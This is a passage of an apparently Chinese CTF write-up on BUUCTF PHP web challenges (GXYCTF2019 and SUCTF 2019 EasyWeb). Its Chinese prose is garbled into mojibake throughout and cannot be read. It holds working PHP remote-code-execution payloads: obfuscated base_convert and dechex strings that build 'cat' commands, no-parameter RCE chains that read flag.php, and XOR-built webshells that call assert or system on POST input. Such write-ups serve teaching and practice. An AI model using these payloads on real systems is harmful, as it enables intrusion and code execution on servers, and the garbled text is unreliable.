<p>è¿™é‡Œç”¨åˆ°äº†<code>apache</code>ä¸‹çš„<code>getallheaders</code>è¿™ä¸ªå‡½æ•°ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web64.png" alt=""><br>æˆ‘ä»¬ç»“åˆè¿™ä¸ªpayloadï¼ŒæŠ“åŒ…ä¹‹ååœ¨å…¶ä¸­æ·»ä¸Š<code>1: cat /flag</code>(<strong>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒBUUçš„flagéƒ½åœ¨æ ¹ç›®å½•ä¸‹ï¼Œç›´æ¥cat /flagå³å¯ï¼Œç½‘ä¸Šä¸€äº›å‚è€ƒé¢˜è§£æ˜¯cat flag.phpæ˜¯è¯»ä¸åˆ°çš„</strong>)ï¼Œæ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web65.png" alt=""></p>
<h4 id="ç›´æ¥æ„é€ æ‹¿cat-flag"><a href="#ç›´æ¥æ„é€ æ‹¿cat-flag" class="headerlink" title="ç›´æ¥æ„é€ æ‹¿cat /flag"></a>ç›´æ¥æ„é€ æ‹¿cat /flag</h4><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">//exec('hex2bin(<span class="name">dechex</span>(<span class="number">109270211257898</span>))') =&gt; exec('cat f*')</span><br><span class="line">($pi=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)($pi(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(<span class="name">dechex</span>(<span class="number">109270211257898</span>)))</span><br><span class="line">//system('cat'.dechex(<span class="number">16</span>)^asinh^pi) =&gt; system('cat *')</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br><span class="line">è¿™ä¸¤æ¡æ˜¯å‚è€ƒç½‘ä¸Šçš„é¢˜è§£ï¼Œæ²¡æœ‰åšå‡ºæ›´æ”¹ï¼Œç”¨çš„è¯ç¨å¾®æ”¹ä¸€ä¸‹å³å¯</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>è€ƒå¯Ÿæ— å‚æ•°RCEï¼Œå‚è€ƒ<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">è¿™ç¯‡æ–‡ç« </a></p>
<h3 id="é¢˜ç›®åˆ†æ-11"><a href="#é¢˜ç›®åˆ†æ-11" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥<code>flagåœ¨å“ªï¼Ÿ</code>å…¶å®æœ‰ç‚¹æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒç½‘ä¸Šçš„é¢˜è§£æç¤ºæ˜¯<code>gitæ³„éœ²</code>ï¼Œä½†æ˜¯ç”¨<code>githack</code>æ²¡è·‘å‡ºæ¥ï¼Œæœ€åè¿˜æ˜¯ç”¨<code>gitextract</code>è·‘å‡ºæ¥äº†æºç ï¼š(githackå¾—æ›´æ–°äº†â€¦)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦ç”¨<code>exp</code>ä¼ å‚ï¼Œä½†æ˜¯å‚æ•°ä¼šç»è¿‡ä¸‰å±‚æ­£åˆ™åŒ¹é…çš„è¿‡æ»¤ï¼š<br>ç¬¬ä¸€å±‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€å±‚è¿‡æ»¤äº†å¸¸ç”¨çš„PHPä¼ªåè®®<br>ç¬¬äºŒå±‚ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, $_GET[<span class="string">'exp'</span>])</span></span>)</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€å±‚çš„åŒ¹é…æ˜æ˜¾æç¤ºæˆ‘ä»¬æ˜¯æ— å‚æ•°RCEï¼Œå…¶ä¸­çš„<code>?R</code>æ˜¯é€’å½’åœ°è¿›è¡ŒåŒ¹é…<br>ç¬¬ä¸‰æ¬¡ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>)</span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤æ‰å¸¸è§çš„å…³é”®å­—ã€‚<br>ç›´æ¥getflagä¸ç°å®äº†ï¼Œé‚£å°±æƒ³åŠæ³•åˆ©ç”¨å‡½æ•°æ¥è·å–ã€‚</p>
<h3 id="è§£é¢˜-13"><a href="#è§£é¢˜-13" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é¦–å…ˆéœ€è¦è·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥å®ç°çš„å‡½æ•°æœ‰<code>scandir(.)</code>(.è¡¨ç¤ºå½“å‰ç›®å½•)ï¼Œä½†æ˜¯<code>.</code>åˆä¸èƒ½ç”¨ï¼Œæ­¤æ—¶æƒ³åˆ°<code>localeconv()</code>ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚æ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code><br>è¿™æ—¶å†å€ŸåŠ©<code>current()/pos()</code>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚ä¹Ÿå°±æ˜¯è¯´<code>current(localeconv())</code>å°±æ˜¯<code>.</code>äº†ã€‚<br>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">pos</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web66.png" alt=""><br>å¯ä»¥çœ‹åˆ°<code>flag.php</code>åœ¨ç¬¬å››ä¸ªæ•°ç»„å…ƒç´ ä¸­ï¼Œè¯»å–å®ƒçš„æºç å°±èƒ½æ‹¿åˆ°flagã€‚å¦‚ä½•è¯»å–å€’æ•°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæœ‰ä¸‰ç§æ–¹æ³•ï¼š<br><strong>1ã€array_reverse()</strong><br>ä»¥ç›¸åçš„é¡ºåºè¿”å›æ•°ç»„å…ƒç´ ï¼Œå†ç»“åˆå‡½æ•°<code>next()</code>å³å¯ã€‚è¿™é‡Œæ„é€ payloadï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web67.png" alt=""><br><strong>2ã€array_rand()å’Œarray_flip()</strong><br><code>array_flip()</code>äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼›<br><code>array_rand()</code>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­scandir()è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥<code>flag.php</code>ã€‚<br>æ„é€ payloadï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">array_rand</span>(<span class="params">array_flip</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web68.png" alt=""><br><strong>3ã€session_id(session_start())</strong><br><code>session_start()</code>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼›<br><code>session_id()</code>è·å–åˆ°å½“å‰çš„session id;<br>æœ¬é¢˜ç›®è™½ç„¶banäº†hexå…³é”®å­—ï¼Œå¯¼è‡´hex2bin()è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸ºflag.phpè¿™äº›å­—ç¬¦æ˜¯PHPSESSIDæœ¬èº«å°±æ”¯æŒçš„ã€‚<br>è¿™é‡Œä½¿ç”¨<code>session</code>ä¹‹å‰éœ€è¦é€šè¿‡<code>session_start()</code>å‘Šè¯‰<code>PHP</code>ä½¿ç”¨<code>session</code>ï¼Œ<code>php</code>é»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨<code>session</code>çš„ã€‚ç„¶ååˆ©ç”¨<code>session_id()</code>è·å–åˆ°å½“å‰çš„session idã€‚æˆ‘ä»¬å†åœ¨<code>header</code>ä¸­è®¾ç½®<code>PHPSESSID</code>çš„<code>cookie</code>ï¼Œå€¼å°±ä¸º<code>flag.php</code>ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web70.png" alt=""></p>
<p>æœ€åå¦‚ä½•è·å–æºç å‘¢ï¼Ÿ<br>å› ä¸º<code>et</code>è¢«banï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>readfile()</code>æˆ–<code>highlight_file()</code>ä»¥åŠå…¶åˆ«åå‡½æ•°<code>show_source()</code>ï¼Œç»“åˆå‡ ç§æ–¹æ³•ï¼Œæœ€ç»ˆæ„é€ ä¸‹åˆ—payloadï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=readfile(next(<span class="built_in">array</span><span class="constructor">_reverse(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">session_id</span>(<span class="params">session_start</span>()</span>));  <span class="comment">//é…åˆBPä½¿ç”¨</span></span><br><span class="line">... è‡ªå·±ç»„åˆå§</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web69.png" alt=""></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>è€ƒå¯Ÿçš„çŸ¥è¯†æœ‰ç‚¹æ‚ï¼Œä¸»è¦æ¶‰åŠ<strong>æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</strong>ã€<strong>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</strong>ã€<strong>ç»•è¿‡open_basedir/disable_function</strong><br>çŸ¥è¯†é‡æœ‰ç‚¹å¤§ï¼Œå¥½å¥½è®°å½•ä¸€ä¸‹ã€‚</p>
<h3 id="çŸ¥è¯†æ‹“å±•"><a href="#çŸ¥è¯†æ‹“å±•" class="headerlink" title="çŸ¥è¯†æ‹“å±•"></a>çŸ¥è¯†æ‹“å±•</h3><h4 id="æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell"><a href="#æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell" class="headerlink" title="æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell"></a>æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</h4><p>é¦–å…ˆï¼Œæ˜ç¡®æ€è·¯ã€‚æˆ‘çš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼Œå°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡º<code>a-z</code>ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚<code>assert</code>ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ã€‚é‚£ä¹ˆï¼Œå˜æ¢æ–¹æ³• å°†æ˜¯è§£å†³æœ¬é¢˜çš„è¦ç‚¹ã€‚</p>
<p>ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘éœ€è¦è¯´è¯´php5å’Œ7çš„å·®å¼‚ã€‚</p>
<p><code>php5</code>ä¸­<code>assert</code>æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>ä½†<code>php7</code>ä¸­ï¼Œ<code>assert</code>ä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼<code>eval</code>ï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨<code>file_put_contents</code>å‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥<code>getshell</code>ã€‚<br>ä»¥ä¸Šå‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">Pç¥çš„åšå®¢</a>ã€‚<br>è¿™é‡Œä»‹ç»ä¸‰ç§æ„é€ shellçš„æ–¹æ³•ï¼š<br><strong>1ã€åˆ©ç”¨å¼‚æˆ–</strong><br>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°<code>a-z</code>ä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚<br>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–ä¹‹åï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚<br>è¿™é‡Œé™„ä¸Šä¸€ä¸ªç½‘ä¸Šçœ‹åˆ°çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);      \\dechex(<span class="number">255</span>) = ff</span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">            <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                $l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åé…åˆä¸‹é¢çš„payloadï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›å‡½æ•°ã€‚</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>
<p>æŠ›å¼€è¿™é“é¢˜ï¼Œè¿˜å¯ä»¥ç±»ä¼¼è¿™æ ·åœ°ä½¿ç”¨ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/?<span class="number">_</span>=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(<span class="string">"type index.php"</span>);&amp;%ff=<span class="keyword">system</span>ã€‚</span><br></pre></td></tr></table></figure>
<p>æœ€åçš„exp:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);</span><br><span class="line">\\assert</span><br><span class="line">$b = <span class="string">"_"</span> . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;</span><br><span class="line">\\$b = $_POST</span><br><span class="line">$a($c[<span class="number">777</span>]);</span><br></pre></td></tr></table></figure>
<p><strong>2ã€å–åæ„é€ </strong><br>ä¸<code>æ–¹æ³•1</code>æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œå”¯ä¸€å·®å¼‚å°±æ˜¯ï¼Œ<code>æ–¹æ³•1</code>ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„<code>å¼‚æˆ–</code>ï¼Œæœ¬æ–¹æ³•ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„<code>å–å</code>ã€‚<br>æœ¬æ–¹æ³•åˆ©ç”¨çš„æ˜¯<code>UTF-8</code>ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚<code>&#39;å’Œ&#39;{2}</code>çš„ç»“æœæ˜¯<code>\x8c</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯<code>s</code>ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„å¦‚ä¸‹å›¾ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web71.jpg" alt=""><br>å›¾ç‰‡æ¥æºäºPç¥çš„é‚£ç¯‡æ–‡ç« ã€‚<br>å½“ç„¶ï¼Œåœ¨è¿™é“é¢˜é‡Œå·²ç»è¿‡æ»¤äº†æ•°å­—ï¼Œé‚£æ€ä¹ˆæ¥æ„é€ <code>{}</code>ä¸­çš„æ•°å­—å‘¢ï¼Ÿ<br>è¿™ä¸ªå¯ä»¥åˆ©ç”¨PHPçš„å¼±ç±»å‹ç‰¹æ€§ï¼š<code>true</code>çš„å€¼ä¸º<code>1</code>ï¼Œæ•…<code>true+true==2</code>ï¼Œä¹Ÿå°±æ˜¯<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>ã€‚<br>ç„¶åä¾¿å¯ä»¥ä¸€æ­¥ä¸€æ­¥æ„é€ å³å¯ã€‚<br>åé¢æœ‰ä¸€ç¯‡åšå®¢é‡Œ<code>[SUCTF 2018]GetShell</code>è¿™é“é¢˜ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚<br><strong>3ã€è‡ªå¢æ„é€ </strong><br>å‚è€ƒ<a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a><br>å¯ä»¥äº†è§£åˆ°<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>ï¼Œ<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>â€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸º<code>a</code>ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—<code>a-z</code>ä¸­æ‰€æœ‰å­—ç¬¦ã€‚<br>é‚£å¦‚ä½•è·å–<code>a</code>å‘¢ï¼Ÿ<br>æ•°ç»„<code>Array</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™<code>A</code>ï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™<code>a</code>ã€‚åˆ©ç”¨å®ƒå¯ä»¥åŒæ—¶æ‹¿åˆ°<code>a</code>å’Œ<code>A</code>ï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°<code>a-z</code>å’Œ<code>A-Z</code>çš„æ‰€æœ‰å­—æ¯äº†ã€‚<br>åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Array</code>ï¼Œç„¶åå†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯<code>A</code>äº†ï¼ŒåŒç†è·å–<code>a</code>ã€‚<br>è¿˜å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹å¼æ¥è·å–ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">B</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"HI!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= <span class="string">"?"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line">    $__();</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1ã€<code>$_++;</code>è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å¯¹å˜é‡åä¸º<code>_</code>çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨PHPä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸º<code>null</code>ï¼Œ<code>null==false==0</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ï¼›<br>2ã€<code>$__=&quot;?&quot; ^ &quot;}&quot;;</code>å¯¹å­—ç¬¦<code>?</code>å’Œ<code>}</code>è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç»“æœ<code>B</code>èµ‹ç»™å˜é‡åä¸º<code>__</code>çš„å˜é‡ï¼›<br>3ã€<code>$__();</code>é€šè¿‡ä¸Šé¢çš„èµ‹å€¼æ“ä½œï¼Œå˜é‡<code>$__</code>çš„å€¼ä¸º<code>B</code>ï¼Œæ‰€ä»¥è¿™è¡Œå¯ä»¥çœ‹ä½œæ˜¯<code>B()</code>,åœ¨PHPä¸­,è¿™è¡Œä»£ç è¡¨ç¤ºè°ƒç”¨å‡½æ•°<code>B</code>,æ‰€ä»¥æ‰§è¡Œç»“æœä¸º<code>HI!</code>,åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ã€‚</p>
</blockquote>
<p>æƒ³è¦æ›´æ·±çš„äº†è§£ï¼Œå‚è€ƒå‰é¢çš„é“¾æ¥ã€‚</p>
